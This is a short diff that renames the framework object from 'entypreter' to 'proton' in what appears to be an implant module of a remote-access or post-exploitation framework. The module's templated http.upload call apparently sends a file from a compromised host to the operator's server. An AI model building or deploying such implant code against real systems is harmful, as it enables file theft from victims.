@@ -1,10 +1,10 @@
 try
 {
-    entypreter.http.upload("~RFILEF~", "data", ~CERTUTIL~);
+    proton.http.upload("~RFILEF~", "data", ~CERTUTIL~);
 }
 catch (e)
 {
-    entypreter.work.error(e);
+    proton.work.error(e);
 }
 
-entypreter.exit();
+proton.exit();
